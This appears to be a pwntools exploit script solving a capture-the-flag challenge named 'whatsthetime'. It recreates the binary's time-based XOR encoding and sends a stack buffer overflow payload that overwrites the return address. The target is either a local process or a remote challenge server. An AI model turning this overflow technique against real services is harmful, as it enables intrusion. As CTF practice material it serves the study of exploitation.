#!/usr/bin/env python3

from pwn import *
import time

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('whatsthetime', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x804923c 

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('143.198.163.4',3000)
else:
    p = process([exe.path])
GDB()

# 1. Get the current Unix timestamp (equivalent to time(0))
current_time = int(time.time())

# 2. Replicate the C integer math (using // for integer division in Python)
math_variable = 60 * (current_time // 60)
info(f"The required math variable is: {math_variable}")

def encode_payload(desired_payload, initial_math):
    # Convert string/bytes to a mutable bytearray
    if isinstance(desired_payload, str):
        desired_payload = desired_payload.encode()
    
    payload = bytearray(desired_payload)
    
    # Pad the payload to a multiple of 4 so the loop doesn't cut off
    while len(payload) % 4 != 0:
        payload.append(0x00) # Null byte padding
        
    encoded = bytearray()
    current_math = initial_math
    
    # Process the payload in 4-byte chunks (matches i += 4)
    for i in range(0, len(payload), 4):
        chunk = payload[i:i+4]
        
        # Match the inner loop (j = 0 to 3)
        for j in range(4):
            # Extract the specific byte of the math variable and XOR
            key_byte = (current_math >> (8 * j)) & 0xFF
            encoded.append(chunk[j] ^ key_byte)
            
        # Increment math just like the C code (++math)
        current_math += 1
        
        # C variables are 32-bit, so we simulate 32-bit overflow just in case
        current_math &= 0xFFFFFFFF 
        
    return bytes(encoded)

load = flat(
    b'a'*0x44,
    0x804923c,
    0x804a018,
)

p.recv(0x58)
s(encode_payload(load, math_variable))

p.interactive()